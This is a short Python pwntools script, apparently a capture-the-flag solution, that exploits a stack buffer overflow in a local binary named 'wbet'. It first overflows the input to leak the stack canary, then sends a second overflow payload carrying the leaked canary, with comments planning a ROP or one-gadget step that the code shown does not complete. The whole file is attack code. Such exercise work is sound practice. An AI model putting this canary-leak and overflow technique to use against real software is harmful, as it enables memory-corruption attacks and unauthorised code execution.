# python3

from pwn import * 
context.local
p = process("./wbet")

#64bit, canary on, pie off, relro partial.
#seems like carary leak - rop - one gadget.
#canary on rbp - 8

#first, leak canary and restart input. 
payload = "a"*0x32 + "b"*7

p.sendlineafter("Your text)",payload)
p.recvuntil("b"*7)
can = u64(b'\x00'+p.recv(7))
log.info(hex(can))

sleep(0.4)

p.sendlineafter("Yes/No)","Yes")

payload2 = b"a"*0x32 + b"c"*6 + p64(can) + b"d"*8

pause()

p.sendlineafter("Your text)",payload2)

p.interactive()